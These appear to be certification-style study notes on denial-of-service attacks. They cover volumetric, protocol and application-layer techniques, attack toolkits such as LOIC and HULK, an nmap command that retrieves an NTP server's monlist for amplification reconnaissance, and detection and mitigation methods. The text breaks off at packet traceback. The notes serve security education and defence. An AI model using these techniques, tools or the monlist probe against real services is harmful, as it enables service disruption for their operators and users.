		- Volumetric attacks consume the bandwidth of a target network or service by generating a large volume of packets. The magnitude of such attacks is measured in bits per second (bps). They often target protocols like the Network Time Protocol (NTP), Domain Name System (DNS), and Simple Service Discovery Protocol (SSDP), which are stateless and lack built-in congestion avoidance mechanisms.
		- Types of Bandwidth Depletion Attacks:
			- Flood Attack: Zombies send large volumes of traffic to the victim’s system, exhausting its bandwidth.
			- Amplification Attack: The attacker or zombies send messages to a broadcast IP address, amplifying malicious traffic that consumes the victim’s bandwidth.
		- Volumetric Attack Techniques: 
			- UDP Flood Attack
			- ICMP Flood Attack
			- Ping of Death (PoD) Attack
			- Smurf Attack
			- Pulse Wave Attack
			- Zero-day Attack
			- Malformed IP Packet Flood Attack
			- Spoofed IP Packet Flood Attack
			- NTP Amplification Attack
	- Protocol Attacks:
		- Protocol attacks consume resources like connection state tables in network infrastructure components such as load balancers, firewalls, and application servers. As a result, no new connections can be established because the device waits for existing connections to close or expire. The magnitude of the attack is measured in packets per second (pps) or connections per second (cps).
		- Protocol Attack Techniques:
			- Synchronize (SYN) Flood Attack
			- Fragmentation Attack
			- Spoofed Session Flood Attack
			- Acknowledgement (ACK) Flood Attack
			- SYN-ACK Flood Attack
			- ACK and PUSH ACK Flood Attack
			- TCP Connection Flood Attack
			- TCP State Exhaustion Attack
			- RST Attack
			- TCP SACK Panic Attack
	- Application Layer Attacks:
		- In application layer attacks, the attacker exploits vulnerabilities in application layer protocols or the application itself to deny legitimate users access. Attacks on unpatched, vulnerable systems require less bandwidth to succeed compared to protocol or volumetric DDoS attacks.
		- Application DDoS attacks target application layer resources by opening connections and leaving them open, preventing new connections from being established. These attacks are designed to disrupt a specific aspect of an application or service and can be effective with only a few attacking machines generating low traffic rates. The magnitude of such attacks is measured in requests per second (rps).
		- These attacks are particularly difficult to detect and mitigate. Application-level flood attacks can result in service outages, such as loss of email functionality, network resources, or temporary shutdowns of applications and services.
		- Application Layer Attack Techniques:
			- HTTP GET/POST Attack
			- Slowloris Attack
			- UDP Application Layer Flood Attack
			- DDoS Extortion Attack
- DoS/DDoS Attack Techniques:
	- UDP Flood Attack:
		- In a UDP flood attack, an attacker sends spoofed UDP packets at a very high rate to random ports on a target server, using a wide range of source IP addresses. The flood of UDP packets forces the server to repeatedly check for non-existent applications on the targeted ports.
		- As a result, legitimate applications become inaccessible, and any attempts to access them generate an ICMP “Destination Unreachable” error reply. This attack consumes network resources and available bandwidth, eventually exhausting the network and causing it to go offline.
	- ICMP Flood Attack:
		- ICMP is primarily used by network administrators for IP operations, troubleshooting, and error messaging for undeliverable packets. In an ICMP flood attack, attackers send large volumes of ICMP echo request packets to a victim’s system, either directly or through reflection networks. These packets prompt the victim’s system to reply, and the resulting high traffic saturates the victim's network bandwidth, overwhelming the connection and preventing it from responding to legitimate TCP/IP requests.
		- To mitigate ICMP flood attacks, a threshold can be set to activate ICMP flood protection when exceeded. If the ICMP threshold is surpassed, the router blocks further ICMP echo requests from all addresses in the same security zone for the remainder of the current second and the following second.
	- Ping of Death Attack:
		- A Ping of Death (PoD) attack involves an attacker attempting to crash, destabilize, or freeze a target system or service by sending malformed or oversized packets using a simple ping command. For instance, an attacker might send a packet with a size of 65,538 bytes to a target server. This size exceeds the RFC 791 IP limit of 65,535 bytes. When the receiving system attempts to reassemble the oversized packet, it may cause the system to crash or become unstable.
		- In such attacks, the attacker’s identity can be easily spoofed, and the attacker typically requires only the target’s IP address, without needing detailed knowledge of the system.
	- Smurf Attack:
		- In a Smurf attack, the attacker spoofs the source IP address to match the victim’s IP address and sends a large number of ICMP ECHO request packets to an IP broadcast address. This action triggers all the hosts on the broadcast network to respond to the ICMP ECHO requests. Since the source IP was spoofed, the responses are directed to the victim’s machine, creating significant traffic that can overwhelm the victim’s system and potentially cause it to crash.
	- Pulse Wave Attack:
		- Pulse wave DDoS attacks are a sophisticated type of DDoS attack used by threat actors to disrupt the operations of target systems. Unlike traditional DDoS attacks, which involve continuous traffic flows, pulse wave attacks feature periodic, high-intensity traffic bursts that consume the entire bandwidth of the target network.
		- Attackers send highly repetitive bursts of packets, or "pulses," to the victim at regular intervals, typically every 10 minutes. These attack sessions can last for hours or even days. A single pulse, often exceeding 300 Gbps, is sufficient to overwhelm a network's bandwidth capacity. Recovery from such attacks is extremely challenging and sometimes impossible.
	- Zero-Day DDos Attack:
		- Zero-day DDoS attacks exploit vulnerabilities that have no available patches or effective defensive mechanisms. Until the victim identifies the attacker’s strategy and implements a patch for the exploited vulnerability, the attacker can block access to the victim’s resources and potentially steal sensitive data. These attacks can inflict significant damage on the victim’s network infrastructure and assets.
		- At present, there is no universal or versatile solution to fully protect networks from zero-day DDoS attacks.
	- NTP Amplification Attack:
		- The Network Time Protocol (NTP) is used to synchronize time across networks, including host machines, processes, and devices. It ensures precise timekeeping, which is essential for various network activities, protocols, and logs.
		- In an NTP amplification attack, an attacker leverages a botnet to send large UDP packets with a spoofed source IP address (impersonating the victim's real IP address) to an NTP server. This attack typically exploits NTP server with its vulnerable monlist command enabled. Each UDP packet triggers a request to the NTP server via the monlist command, causing the server to generate and send large response packets. The server, unaware of the spoofed source, directs these responses to the victim’s IP address.
		- As a result, the victim’s network is overwhelmed with large response packets, flooding its infrastructure with unwanted traffic. This leads to a denial-of-service scenario, causing severe network congestion, service disruption, and depletion of critical resources, such as bandwidth, memory, and processing power.
		- Retrieve Monlist from an NTP Server:
			- After executing the command, Nmap provides a list of public and private clients that have communicated with the NTP server.
			- nmap -sU -pU:123 -Pn -n --script=ntp-monlist <ip>
		- Countermeasures for NTP Amplification Attacks:
			- Secure and harden NTP server configurations to prevent exploitation of the monlist command.
			- Enable flow control mechanisms on the NTP server to limit traffic.
			- Regularly monitor the network for abnormal behavior or suspicious activity.
			- Implement a zero-trust network architecture to enhance security.
			- Use firewalls to filter and restrict NTP server requests.
	- TCP State Exhaustion Attack:
		- A TCP state exhaustion attack targets network devices such as firewalls, load balancers, and servers by exploiting the stateful nature of the TCP protocol. These attacks aim to overwhelm the capacity of these devices to maintain active connection states, causing disruptions to legitimate traffic.
		- In the TCP protocol, devices track connection states (e.g., SYN_SENT, ESTABLISHED, CLOSED) for every active session. Attackers exploit this by generating a massive number of TCP connections, often leaving them incomplete or flooding the system with unnecessary state-tracking tasks. This can exhaust the device's available resources, such as memory and connection tables, rendering it unable to handle new or legitimate connections.
		- Types of TCP State Exhaustion Attacks include SYN Flood, ACK Flood, and RST/FIN Flood.
	- SYN Flood Attack:
		- In a SYN flood attack, the attacker sends a large number of SYN requests to the target server (victim) using fake source IP addresses. This attack creates incomplete TCP connections, consuming network resources and overwhelming the target system.
		- Normally, when a client initiates a TCP connection with a server, the connection is established using the TCP three-way handshake. In a SYN flood attack, the attacker exploits this process. The attacker sends fake TCP SYN requests to the target server. When the server responds with a SYN/ACK, the attacker never completes the handshake by sending the final ACK. This leaves the server waiting indefinitely, tying up resources.
		- SYN flooding exploits flaws in the way most systems implement the TCP three-way handshake. The attack overwhelms the server by sending an unlimited number of SYN packets faster than the system can process them. The server's listening queue becomes filled with partially open connections while it waits for ACK packets that never arrive, eventually leading to resource exhaustion and service disruption.
		- Countermeasures for SYN Flood Attacks:
			- Proper packet filtering is an effective solution to mitigate SYN flood attacks. Administrators can also fine-tune the TCP/IP stack to minimize the impact of these attacks while ensuring legitimate client traffic is unaffected.
			- Some SYN flood attacks aim not to disrupt servers but to consume the entire bandwidth of an internet connection. Tools like SYN Cookies and SynAttackProtect can help counter such attacks.
			- To further safeguard against bandwidth exhaustion, administrators can implement additional measures:
				- Reducing the timeout period during which a pending connection remains in the "SYN RECEIVED" state in the queue.
				- Decreasing the retransmission interval for the first ACK packet if no response is received from the client.
				- Limiting the number of packet retransmissions or disabling retransmissions entirely.
	- SYN-ACK Flood Attack:
		- A SYN-ACK flood attack is similar to a SYN flood attack, but it targets the second stage of the TCP three-way handshake. In this attack, the attacker sends a large number of SYN-ACK packets to the target machine, overwhelming its resources. This flood of packets prevents the target from processing legitimate traffic, ultimately exhausting its capacity and disrupting normal operations.
	- ACK and PUSH ACK Flood Attack:
		- In an active TCP session, ACK and PUSH ACK flags are used to transfer data between the server and client machines until the session concludes. In an ACK and PUSH ACK flood attack, attackers send a large volume of spoofed ACK and PUSH ACK packets to the target machine, overwhelming its resources and rendering it non-functional.
	- ACK Flood Attack:
		- In an ACK flood attack, the attacker overwhelms the target system by sending a massive number of TCP ACK packets. These packets flood the target's network or server, consuming its bandwidth and processing resources. Since the target must process each ACK packet as part of TCP session handling, this attack can lead to performance degradation or complete denial of service, making it difficult for legitimate users to access the target system.
	- Fragmentation Attack:
		- Fragmentation attacks disrupt a victim’s ability to reassemble fragmented packets by flooding it with TCP or UDP fragments, leading to reduced performance. In these attacks, the attacker sends a large number of oversized fragmented packets (exceeding 1500 bytes) to a target web server at a relatively low packet rate.
		- Since network protocols permit fragmentation, these packets often bypass inspection by network devices such as routers, firewalls, and IDS/IPS. The process of reassembling and inspecting these large fragmented packets consumes excessive system resources.
		- Additionally, the attacker randomizes the content within the packet fragments, further increasing the complexity of reassembly and inspection. This excessive resource consumption can eventually lead to system crashes or significant degradation in performance.
	- Spoofed Session Flood Attack:
		- In this type of attack, attackers create fake or spoofed TCP sessions by sending multiple SYN, ACK, and RST or FIN packets. This technique is used to bypass firewalls and perform DDoS attacks against target networks, ultimately exhausting its network resources.
		- Examples of Spoofed Session Flood Attacks:
			- Multiple SYN-ACK Spoofed Session Flood Attack:
				- Attackers create a fake session by sending multiple SYN and ACK packets, along with one or more RST or FIN packets.
			- Multiple ACK Spoofed Session Flood Attack:
				- Attackers create a fake session by skipping SYN packets entirely and sending only multiple ACK packets along with one or more RST or FIN packets. Since SYN packets are not used and most firewalls rely on SYN packet filters to detect abnormal traffic, these attacks have a low detection rate.
	- HTTPS GET/POST Attack:
		- HTTP attacks are Layer-7 attacks that exploit the HTTP protocol. HTTP clients, such as web browsers, connect to a web server using the HTTP protocol to send requests, such as HTTP GET or HTTP POST. Attackers take advantage of these requests to perform DoS attacks.
		- An HTTP GET/POST attack is a sophisticated Layer-7 attack that does not rely on malformed packets, spoofing, or reflection techniques. It requires significantly less bandwidth compared to other attacks to incapacitate the targeted site or web server.
		- The goal of this attack is to force the server to allocate as many resources as possible to process the attack, thereby denying legitimate users access to the server’s resources.
		- HTTP GET Attack:
			- In an HTTP GET attack, the attacker uses a time-delayed HTTP header to maintain an HTTP connection and exhaust the web server’s resources. The attacker never sends the full request to the target server, causing the server to retain the HTTP connection and wait indefinitely. This prevents the server from processing requests from legitimate users. In such attacks, network parameters may appear normal, even while the service is unavailable.
		- HTTP POST Attack:
			- In an HTTP POST attack, the attacker sends HTTP requests with complete headers but an incomplete message body to the target web server or application. Since the message body is incomplete, the server continues to wait for the remainder, making it unavailable to legitimate users.
		- Additional HTTP Flood Attacks:
			- Single-Session HTTP Flood Attack: In this type of attack, an attacker exploits vulnerabilities in HTTP 1.1 to send multiple requests within a single HTTP session, overwhelming the target server.
			- Single-Request HTTP Flood Attack: In this attack, the attacker sends multiple HTTP requests concealed within a single HTTP packet during a single session. This technique enables attackers to remain anonymous and undetected while carrying out DDoS attacks.
			- Recursive HTTP GET Flood Attack: Staying undetected is key for attackers. In this attack, an attacker poses as a legitimate user and performs seemingly valid actions to deceive firewalls into believing the source is legitimate. The recursive GET method collects a list of pages or images and appears to navigate through them. However, it stealthily floods the target with requests. When combined with an HTTP flood attack, recursive GET attacks can inflict significant damage on the target system.
			- Random Recursive GET Flood Attack: This variation of the recursive GET flood attack targets forums, blogs, and other websites with sequentially numbered pages. Similar to the recursive GET flood attack, the attacker pretends to browse through pages. However, instead of following a sequence, the attacker uses random numbers from a valid page range to simulate legitimate user behavior, sending new GET requests each time. Both recursive GET and random recursive GET flood attacks overwhelm the target with a high volume of GET requests, ultimately exhausting its resources.
	- Slowloris Attack:
		- Slowloris is a DDoS attack tool designed to perform Layer-7 DDoS attacks, targeting web infrastructure. Unlike other tools, Slowloris uses entirely legitimate HTTP traffic to disrupt a target server.
		- In a Slowloris attack, the attacker sends partial HTTP requests to the target web server or application. Upon receiving these requests, the target server opens multiple connections and waits for them to complete. However, the requests remain incomplete, filling up the server's maximum concurrent connection pool. As a result, additional connection attempts are denied, making the server inaccessible to legitimate users.
	- UDP Application Layer Flood Attack:
		- Although UDP flood attacks are primarily known for their volumetric nature, certain application layer protocols that rely on UDP can also be exploited by attackers to perform flooding attacks on target networks.
		- Examples of UDP-based Application Layer Protocols that attackers can use to flood target networks:
			- Character Generator Protocol (CHARGEN)
			- Simple Network Management Protocol Version 2 (SNMPv2)
			- Quote of the Day (QOTD)
			- Remote Procedure Call (RPC)
			- Simple Service Discovery Protocol (SSDP)
			- Connection-less Lightweight Directory Access Protocol (CLDAP)
			- Trivial File Transfer Protocol (TFTP)
			- Network Basic Input/Output System (NetBIOS)
			- Network Time Protocol (NTP)
			- Quake Network Protocol
			- Steam Protocol
			- Voice over Internet Protocol (VoIP)
	- Multi-Vector Attack:
		- In multi-vector DDoS attacks, attackers combine volumetric, protocol, and application-layer attack techniques to overwhelm and disrupt the target system or service. They rapidly switch from one type of DDoS attack (e.g., SYN flood) to another (e.g., layer-7 attack). These attacks can be launched sequentially, with one vector at a time, or simultaneously through multiple vectors.
		- The objective is to confuse the target’s IT department, forcing them to expend significant resources and divert their attention, while the attack continues to cause damage.
	- Peer-to-Peer Attack:
		- A peer-to-peer attack is a type of DDoS attack in which attackers exploit vulnerabilities in peer-to-peer servers to initiate an attack. They take advantage of flaws in networks using the Direct Connect (DC++) protocol, which facilitates file exchanges between instant-messaging clients. Unlike botnet-based attacks, a peer-to-peer attack does not rely on botnets or require direct communication with the clients being exploited. Instead, the attacker instructs clients from large peer-to-peer file-sharing hubs to disconnect from their network and connect to the victim’s website. As a result, thousands of computers aggressively attempt to connect to the target website, significantly degrading its performance or causing it to crash.
		- Peer-to-peer attacks are relatively easy to identify based on their signatures. Attackers can use this method to launch large-scale DoS attacks against websites. To mitigate peer-to-peer DDoS attacks, restricting specific ports for peer-to-peer communication is an effective strategy. For example, disallowing peer-to-peer communication on port 80 minimizes the risk of attacks targeting websites.
	- Permanent Denial-of-Service Attack (PDoS):
		- Permanent DoS (PDoS) attacks, also known as "phlashing," specifically target hardware to cause irreversible damage to the system hardware. Unlike other types of DoS attacks that disrupt services temporarily, PDoS attacks sabotage the system’s hardware, often requiring the victim to replace or reinstall the damaged components. PDoS attacks exploit security vulnerabilities in a device’s management interfaces, such as those found in printers, routers, and other networking devices. By targeting these flaws, attackers gain unauthorized remote access and control over the victim’s hardware.
		- This type of attack is faster and more destructive than traditional DoS attacks. Unlike DDoS attacks that rely on a network of compromised machines (zombies), PDoS attacks achieve their goal with minimal resources. Attackers commonly use a technique called “bricking,” where they render hardware completely inoperable.
		- In a PDoS attack, the attacker sends fraudulent emails, IRC messages, tweets, or videos containing links to fake hardware updates. These updates are deliberately modified with vulnerabilities or corrupted firmware. When the victim clicks on a malicious link or pop-up and installs the fraudulent update, the attacker gains complete control of the device. This results in permanent damage, effectively rendering the system unusable.
	- TCP SACK Panic Attack:
		- A TCP Selective Acknowledgment (SACK) panic attack is a remote attack vector where attackers attempt to crash a target Linux machine by sending SACK packets with a malformed maximum segment size (MSS). This attack exploits an integer overflow vulnerability in the Linux Socket Buffer (SKB), which can lead to kernel panic.
		- Linux systems commonly use the TCP SACK mechanism, where the sender is informed about successfully acknowledged packets by the receiver. This allows the sender to retransmit only those packets that were not acknowledged. Linux uses a linked-list data structure called the socket buffer to store data until it is either acknowledged or received. The socket buffer can store a maximum of 17 segments, and once packets are acknowledged, they are deleted from the buffer. However, if the socket buffer attempts to store more than 17 segments, it can cause a kernel panic due to integer overflow.
		- Attackers exploit this vulnerability in a TCP SACK panic attack by sending specially crafted SACK packets in sequence to the target server. They set the MSS to the lowest possible value (48 bytes), which increases the number of TCP segments requiring retransmission. This overloads the socket buffer, causing it to exceed its 17-segment limit. The resulting integer overflow triggers a kernel panic, leading to a denial-of-service (DoS) condition.
		- Because the vulnerability resides in the kernel stack, attackers can also use this method to target containers and virtual machines, further expanding the scope of the attack.
		- Countermeasures:
			- Implement Vulnerability Patching: Regularly update and patch Linux systems to address the vulnerabilities that enable TCP SACK panic attacks. This ensures the system is protected from known exploits.
			- Implement Firewall Rules: Configure firewalls to block incoming packets with the lowest MSS value (e.g., 48 bytes), which are commonly used in this type of attack.
	- Distributed Reflection DoS (DRDoS) Attack:
		- A Distributed Reflection Denial-of-Service (DRDoS) attack, also known as a "spoofed" attack, leverages multiple intermediary and secondary machines to amplify a DDoS attack on a target system or application. This attack exploits the TCP three-way handshake vulnerability to overwhelm the target with traffic.
		- A DRDoS attack involves four key components: an attacker machine, intermediary victims (zombies), secondary victims (reflectors), and a target machine. The attacker initiates the attack by sending requests to the intermediary hosts (zombies), which forward these requests to the secondary machines (reflectors). The reflectors then redirect the attack traffic to the target.
			- Attacker Machine: Initiates the attack
			- Intermediary Victims (Zombies): Compromised systems under the attacker's control
			- Secondary Victims (Reflectors): Non-compromised systems that reflect traffic
			- Target Machine: The system under attack
		- Process of DRDoS Attack:
			- The attacker commands intermediary victims (zombies) to send a stream of packets (TCP SYN) with the primary target’s IP address spoofed as the source IP. These packets are directed to non-compromised machines, known as secondary victims or reflectors, to deceive them into establishing a connection with the primary target.
			- The reflectors, believing the connection requests are legitimate, respond by sending a large volume of traffic (SYN/ACK packets) to the primary target, aiming to establish a new connection.
			- Since the primary target never initiated the connection, it discards the SYN/ACK packets received from the reflectors.
			- Meanwhile, the reflectors, expecting an ACK response from the primary target, assume the packets were lost and resend SYN/ACK packets to the target, repeating this process until a timeout occurs.
			- As a result, the primary target is overwhelmed with a massive volume of traffic from multiple reflectors, consuming its bandwidth and resources.
			- The combined bandwidth and traffic generated by the reflector machines effectively overwhelm the target, causing a denial of service.
		- Advantages of DRDoS Attacks:
			- Anonymity: The reflectors appear to be the attackers, making it nearly impossible to trace the actual attacker.
			- Amplification: The attack uses multiple intermediary and secondary victims to generate significant bandwidth, making it more effective than standard DDoS attacks.
		- Countermeasures:
			- Disable the Character Generator Protocol (CHARGEN) service to block this attack method.
			- Regularly update and patch servers to address vulnerabilities.
	- DDoS Extortion/Ransom DDoS (RDDoS) Attack:
		- A DDoS extortion attack, also known as a ransom DDoS (RDDoS) attack, involves attackers threatening target organizations with a DDoS attack and demanding a ransom payment. Attackers may send a ransom note or initiate a small-scale DDoS attack, often using a botnet, to demonstrate the legitimacy of their threat.
		- Typically, the attackers follow up with an email containing an extortion note that outlines the payment instructions, deadline, and potential consequences if the ransom is not paid. These notes often include additional threats, such as exposing vulnerabilities, sensitive assets, or data, along with detailed instructions for paying the ransom via digital currency. Attackers frequently exaggerate their capabilities, claiming to possess high-capacity DDoS tools capable of inflicting significant damage to the organization’s operations.
		- Countermeasures:
			- Deploy robust DDoS defense tools to detect and mitigate attacks.
			- Report immediately to law enforcement agencies and security teams upon receiving a ransom note.
			- Conduct regular risk assessments to evaluate asset vulnerabilities.
			- Implement mitigation strategies, such as BGP/DNS swing or always-on protection services.
- DoS/DDoS Attack Toolkits:
	- ISB : Attackers can use the ISB (I'm So Bored) software utility to launch DDoS attacks on a target network. The tool allows attackers to perform HTTP, UDP, TCP, and ICMP flood attacks. Additionally, it provides one-click access to commonly used network commands such as WHOIS, netstat, traceroute, and ping, which assist attackers in discovering and analyzing the target.
	- UltraDDOS-v2 : UltraDDOS-v2 is a DDoS tool that enables attackers to launch DDoS attacks on target websites or servers. The tool features a simple GUI interface where attackers can input the target IP address, port number, and the desired number of packets to transmit.
	- High Orbit Ion Cannon (HOIC) (sourceforge.net)
	- Low Orbit Ion Cannon (LOIC) (sourceforge.net)
	- HULK (github.com)
	- Slowloris (github.com)
	- UFONet (ufonet.03c8.net)
	- Packet Flooder Tool (www.netscantools.com)
- DoS/DDoS Attack Countermeasures:
	- Detection Techniques:
		- A DoS/DDoS attack traffic detector must differentiate between genuine and bogus data packets, which is not always straightforward. There is always the possibility of confusion between traffic generated by legitimate network users and traffic generated by a DoS/DDoS attack.
		- Detection techniques focus on identifying and distinguishing between illegitimate traffic spikes and legitimate packet traffic. One challenge in filtering bogus traffic from legitimate traffic is the sheer volume of traffic. It is not feasible to scan each packet individually to ensure protection from a DoS/DDoS attack.
		- All detection techniques define an attack as an abnormal and significant deviation from the normal threshold of network traffic statistics and characteristics. These methods typically involve statistical analysis of deviations to classify traffic as either malicious or legitimate.
		- Types of Detection Techniques:
			- Activity Profiling:
				- Activity profiling is performed based on the average packet rate of network flows, which consist of consecutive packets sharing similar packet header information. The packet header information includes the IP addresses of the sender and destination, ports, and the transport protocols in use. Activity profiles are generated by monitoring this network packet header information.
				- An attack can be indicated by:
					- An increase in activity levels within network flow clusters.
					- An increase in the overall number of distinct clusters (indicating a potential DDoS attack).
				- For a higher average packet rate or activity level within a flow, the time between consecutive matching packets is shorter. Randomness in the average packet rate or activity level can signal suspicious activity. The entropy calculation method is used to measure this randomness. During an attack, the entropy of network activity levels tends to increase significantly.
				- One major challenge in the activity profiling method is the enormous volume of network traffic. This issue can be addressed by clustering packet flows with similar characteristics. Since DoS attacks typically generate a large number of highly similar data packets, a noticeable increase in the average packet rate or packet diversity could indicate a potential DoS attack.
			- Sequential Change-Point Detection:
				- The sequential change-point detection technique filters network traffic based on IP addresses, targeted port numbers, and communication protocols. The traffic flow data is stored as a graph showing the traffic flow rate over time. Change-point detection algorithms are then used to isolate changes in network traffic statistics and flow rates caused by potential attacks. A sudden, drastic change in traffic flow rate may indicate a DoS attack.
				- This technique employs the Cumulative Sum (CUSUM) algorithm to identify and locate DoS attacks. The algorithm calculates deviations between the actual and expected local average traffic in the time series. The sequential change-point detection technique is also effective at identifying typical scanning activities performed by network worms.
			- Wavelet-Based Signal Analysis:
				- The wavelet analysis technique examines network traffic by analyzing its spectral components. It decomposes incoming signals into various frequency bands and evaluates each frequency component separately. By analyzing the energy within each spectral window, anomalies can be detected. This technique identifies frequency components present at specific times and provides a description of those components. The presence of an unfamiliar frequency is often an indicator of suspicious network activity.
				- A network signal typically consists of time-localized data packet flow signals and background noise. Wavelet-based signal analysis filters out anomalous traffic flow signals from background noise. Normal network traffic usually exhibits low-frequency signals, whereas during an attack, the high-frequency components of the signal tend to increase.
	- DoS/DDoS Countermeasure Strategies:
		- Absorbing the Attack:
			- This strategy involves using additional capacity to absorb the attack, which requires careful preplanning and extra resources.
			- The primary disadvantage is the ongoing cost of maintaining additional resources, even when no attacks are occurring.
		- Degrading Services:
			- When it is not possible to maintain all services during an attack, prioritizing critical services is a practical approach.
			- In this strategy, critical services are identified in advance, and the network, systems, and application designs are customized to reduce or disable non-critical services. This ensures that critical services remain operational during an attack.
		- Shutting Down Services:
			- This strategy involves temporarily shutting down all services until the attack subsides. While not ideal, it can be a reasonable response in situations where maintaining services is impossible or would exacerbate the impact of the attack.
	- DDoS Attack Countermeasures: 
		- Protect Secondary Victims:
			- Individual Users: Preventing secondary systems from participating in DDoS attacks requires regular monitoring, updated antivirus and anti-Trojan software, and applying software patches to address vulnerabilities. Users should disable unnecessary services, uninstall unused applications, and scan external files. Built-in hardware and software defenses must be properly configured and updated to block DDoS agent software and traffic. These measures ensure attackers cannot exploit secondary systems.
			- Network Service Providers: Service providers and network administrators can adopt dynamic pricing models to encourage users to enhance their security and avoid becoming part of a DDoS attack network.
		- Detect and Neutralize Handlers:
			- Stopping DDoS attacks involves identifying and neutralizing handlers through traffic analysis, botnet disruption, and spoofed address detection. Handlers act as intermediaries for launching attacks. Analyzing traffic between handlers, clients, and agents can reveal infected nodes. Disabling handlers disrupts the attack network, as neutralizing a few handlers can render many agents ineffective. Detecting and filtering spoofed source addresses further mitigates DDoS attacks.
			- Network Traffic Analysis: Analyze communication protocols and traffic patterns between handlers and clients or handlers and agents to identify network nodes potentially infected by handlers.
			- Neutralize Botnet Handlers: Since the number of handlers is typically much smaller than the number of agents, neutralizing a few handlers can render multiple agents ineffective, disrupting DDoS attacks.
			- Spoofed Source Address: Spoofed source addresses in DDoS packets often do not correspond to valid sub-network addresses. Identifying and filtering these addresses can help mitigate the attack.
		- Prevent Potential Attacks:
			- Egress Filtering:
				- Egress filtering inspects the headers of IP packets leaving a network. Packets that meet the specified criteria are allowed to exit the sub-network, while those that fail are blocked, ensuring that unauthorized or malicious traffic does not leave the internal network.
				- DDoS attacks often involve spoofed IP addresses. Mitigation can be achieved by establishing protocols that ensure any outgoing packet has a source address matching the internal network. A well-configured sub-network firewall can further block many DDoS packets with spoofed source IP addresses.
				- Even with all available patches applied, a web server may remain vulnerable to zero-day attacks known only to underground hacker communities. However, enabling egress filtering can preserve system integrity by preventing the server from connecting back to the attacker. This reduces the effectiveness of many exploit payloads. By restricting outbound traffic to only necessary connections, egress filtering limits an attacker’s ability to exploit other systems or gain further access to the network.
			- Ingress Filtering:
				- Ingress filtering is a packet filtering technique employed by many Internet Service Providers (ISPs) to prevent source address spoofing in Internet traffic. By ensuring that incoming packets have legitimate and verifiable source addresses, ingress filtering helps make Internet traffic traceable to its true origin.
				- This technique indirectly combats various forms of network abuse, including flooding attacks originating from valid IP prefixes, and allows the source of the attack to be accurately identified.
			- TCP Intercept:
				- TCP intercept is a traffic-filtering feature used in routers to protect TCP servers from TCP SYN-flooding attacks, a type of DoS attack. In a SYN-flooding attack, the attacker sends a massive number of connection requests using unreachable return addresses. Since the return addresses are invalid, the connections cannot be established, leaving them unresolved. The server becomes overwhelmed by the large volume of unresolved connections, potentially denying service to legitimate requests. This can prevent users from connecting to websites, accessing email, using FTP services, and more.
				- Configuring TCP intercept features helps prevent DoS attacks by intercepting and validating TCP connection requests. In TCP intercept mode, the router intercepts SYN packets sent by clients to a server and compares them with an extended access list. If a match is found, the intercept software establishes a connection with the client on behalf of the server. Similarly, it establishes a connection with the server on behalf of the client. Once both half-connections are created, the intercept software transparently combines them. This process ensures that fake connection attempts are filtered out before reaching the server, with the intercept software acting as a mediator between the client and the server throughout the connection.
			- Rate Limiting:
				- Rate limiting is a technique used to control the rate of outbound or inbound traffic on a network interface controller. It is an effective method for reducing high volumes of inbound traffic that can lead to DDoS attacks. This technique is particularly crucial in hardware appliances, where it is configured to limit the rate of requests at layers 4 and 5 of the Open Systems Interconnection (OSI) model.
		- Deflect Attacks:
			- Systems configured with limited security, known as honeypots, are designed to attract attackers. Recent research shows that a honeypot can simulate all aspects of a network, including web servers, mail servers, and clients. These systems are deliberately set up with minimal security to draw the attention of DDoS attackers, serving as tools to gather information about their techniques, tools, and behaviors by recording system activities.
			- DDoS attackers attracted to a honeypot may install handlers or agent code within it, sparing more critical systems from compromise. Honeypots not only protect actual systems but also record detailed logs of attackers' activities, enabling the honeypot owner to track and analyze handler or agent behavior. This information can be used to bolster defenses against future DDoS attacks. A defense-in-depth approach, incorporating Internet Protocol Security (IPsec), can divert suspicious DoS traffic to multiple honeypots, enhancing security.
			- Types of Honeypots:
				- Low-Interaction Honeypots: Simulate specific services or applications with limited functionality to detect and log attacks.
				- High-Interaction Honeypots: Fully simulate entire systems or networks, allowing attackers to interact more extensively.
			- An example of a high-interaction honeypot is a honeynet. Honeynets simulate the complete layout of a computer network and are designed to "capture" attacks. Their goal is to create a controlled environment where all activities are monitored and recorded. Honeynets often contain decoy systems and even real computers running actual applications to deceive attackers and gather intelligence.
			- DoS/DDoS Countermeasure Honeypot Tools:
				- Blumira Honeypot Software (www.blumira.com) : Blumira honeypot software is a deception technology designed to help security professionals detect unauthorized access attempts and identify attackers’ lateral movement across an organization’s network, even if a breach has already occurred. It enhances an organization’s security posture by enabling early attack detection with minimal maintenance and overhead. When Blumira detects a honeypot security event, it promptly blocks the source IP at the switch or firewall level, mitigating potential threats effectively.
				- KFSensor (www.kfsensor.net)
				- Valhala Honeypot (sourceforge.net)
				- Cowrie (github.com)
				- HoneyHTTPD (github.com)
				- StingBox (www.stingbox.com)
		- Mitigate Attacks:
			- Load Balancing:
				- Increase bandwidth on critical connections to absorb the additional traffic generated by an attack. Bandwidth providers can scale up bandwidth on critical connections during a DDoS attack to prevent server shutdowns. Using a replicated server model provides additional fail-safe protection.
				- Replicated servers improve load management by balancing traffic/load across multiple servers in a multiple-server architecture. This approach not only enhances normal network performance but also helps mitigate the impact of DDoS attacks.
			- Throttling:
				- Configure routers to access a server with logic that throttles incoming traffic to safe levels for the server. Throttling involves setting up routers with rules that limit the incoming traffic to levels the server can handle. The "min-max fair server-centric router" throttles, which control minimum and maximum throughput, help prevent server shutdowns.
				- Throttling protects servers by managing DoS traffic and preventing damage. This method allows routers to handle heavy incoming traffic, ensuring the server can process it. It also helps filter legitimate user traffic from malicious DDoS attack traffic, allowing only legitimate traffic to pass through for better results. A major limitation of this approach is that it may trigger false alarms, occasionally allowing malicious traffic to bypass while blocking some legitimate traffic.
			- Drop Requests:
				- In this technique, servers and routers drop packets when the load increases, typically performed by the router or server. Before processing a request, the system may induce the requester to drop it by requiring them to solve a complex puzzle that demands significant memory or computational power.
				- This forces the requester to abandon the request if they cannot solve the puzzle. As a result, users of compromised systems (zombie systems) may experience performance degradation, potentially dissuading them from participating in transferring DDoS attack traffic.
		- Post-Attack Forensics:
			- Traffic Pattern Analysis:
				- During a DDoS attack, the traffic pattern tool collects post-attack data, which users can analyze to identify characteristics unique to the attacking traffic. The results of this analysis help update load balancing and throttling countermeasures, improving both efficiency and protection.
				- Traffic pattern analysis also assists network administrators in developing new filtering techniques to block DDoS attack traffic from entering or leaving their networks. Furthermore, analyzing DDoS traffic patterns helps administrators ensure that attackers cannot use their servers as a platform to launch attacks on other sites.
			- Packet Traceback:
